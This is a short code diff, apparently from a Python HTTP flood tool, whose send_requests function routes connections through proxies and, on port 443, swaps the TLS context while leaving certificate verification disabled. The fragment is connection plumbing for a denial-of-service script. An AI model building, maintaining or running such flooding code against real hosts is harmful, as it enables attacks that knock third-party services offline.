@@ -432,7 +432,7 @@ def send_requests(): #傳統HTTP FLOOD
             s.set_proxy(p_Type, proxy_ip, proxy_port)
             s.connect((host, port))
             if port == 443:
-                context = ssl.create_default_context()
+                context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT) # 使用標準TLS
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
                 s = context.wrap_socket(s, server_hostname=host)
